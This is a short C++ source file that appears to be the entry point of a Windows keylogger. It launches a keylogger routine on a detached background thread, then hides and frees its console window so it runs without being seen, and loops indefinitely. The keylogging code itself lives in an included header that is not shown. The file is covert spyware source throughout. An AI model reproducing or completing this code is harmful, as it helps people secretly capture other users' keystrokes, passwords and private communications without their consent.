#include "common.hpp"
#include "util/logger.hpp"
#include "util/keylogger.hpp"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow = false)
{
	auto logger_instance = std::make_unique<logger>();

	spdlog::info("loading keylogger::keylogger");

	std::thread(keylogger::keylogger).detach();

	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
	FreeConsole();

	while (TRUE != 0)
	{
		logger_instance.reset();
		std::this_thread::sleep_for(std::chrono::seconds(1000));
	}
}